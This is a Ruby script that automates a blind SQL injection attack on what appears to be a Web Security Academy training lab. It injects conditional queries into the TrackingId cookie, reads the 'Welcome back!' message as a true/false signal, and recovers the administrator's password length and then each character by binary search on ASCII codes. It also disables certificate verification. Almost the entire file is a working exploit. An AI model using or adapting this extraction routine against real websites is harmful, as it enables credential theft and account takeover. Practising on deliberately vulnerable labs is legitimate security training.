# MUST LOGIN IN BROWSER FIRST AND SET TRACKINDID & SESSION_COOKIE

require 'uri'
require 'net/http'
require 'openssl'

SESSION_COOKIE = "zfqEKDi2TcYyZZNUlvNzLmtB0AijktlQ"
TRACKING_ID = "KdqEkNBn4YpV5MBT"
BASE_URI = URI("https://0a2a0095048f06d780fafd0400070043.web-security-academy.net/")
CHARS = ('a'..'z').to_a.concat((0..9).to_a)
ASCII_MIN = 32
ASCII_MAX = 126

def http_client
  http = Net::HTTP.new(BASE_URI.host, BASE_URI.port)
  http.use_ssl = (BASE_URI.scheme == "https")
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
  http.open_timeout = 5
  http.read_timeout = 10
  http
end

def built_request(injected_tracking_id)
  req = Net::HTTP::Get.new(BASE_URI.request_uri)
  req["Accept"] = "text/html"
  req["Cookie"] = "TrackingId=#{injected_tracking_id}; session=#{SESSION_COOKIE}"
  req
end

def sql_password_length(operator, length)
  "#{TRACKING_ID}' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) #{operator} #{length})='a"
end

def sql_char_test(pword_char_index, test_ascii_no, operator)
  "#{TRACKING_ID}' AND ASCII((
    SELECT SUBSTRING(password, #{pword_char_index}, 1)
    FROM users
    WHERE username='administrator'
  )) #{operator} '#{test_ascii_no}"
end

def password_length?(max_length: 30)
  (1..max_length).each do |n|
    tracking_sql = sql_password_length('>', n)
    greater_than_n = valid_request(tracking_sql)
    puts greater_than_n ? "Password is greater than #{n}" : "Password is NOT greater than #{n}"
    return n unless greater_than_n
  end

  nil
end

def valid_request(injected_tracking_id = TRACKING_ID)
  response = http_client.request(built_request(injected_tracking_id))

  puts response.code == '200' ? "Status: ✅ #{response.code} #{response.message}" : "Status: ❌ #{response.code} #{response.message}"
  puts "Content-Type: #{response['content-type']}"
  puts "Body bytes: #{response.body.bytesize}"
  valid = welcome_back_present?(response.body)
  puts valid ? "Valid" : "Invalid"
  return valid
end

def welcome_back_present?(response_body)
  response_body.include?("Welcome back!")
end

def find_ASCII_at(idx, min_ASCII=ASCII_MIN, max_ASCII=ASCII_MAX)
  if min_ASCII == max_ASCII
    puts "ASCII char is === #{min_ASCII}"
    puts "alphanumeric char is === #{min_ASCII.chr(Encoding::ASCII)}"
    return min_ASCII
  end
  
  mid_ASCII = (min_ASCII + max_ASCII) / 2

  sql = sql_char_test(idx, mid_ASCII, '>').gsub(/[\r\n]/, "")

  is_above_mid = valid_request(sql)

  if is_above_mid
    # therefore value is somewhere in mid + 1..max
    find_ASCII_at(idx, mid_ASCII + 1, max_ASCII)
  else
    # therefore value is somewhere in min..mid
    find_ASCII_at(idx, min_ASCII, mid_ASCII)
  end
end

def fuzz_password
  password_length = password_length?
  password_chars = []

  (1..password_length).each do |idx|
    password_chars << find_ASCII_at(idx, ASCII_MIN, ASCII_MAX)
  end

  password_chars.map { |ascii| ascii.chr(Encoding::ASCII) }.join
end

ADMIN_PASSWORD = fuzz_password

puts ADMIN_PASSWORD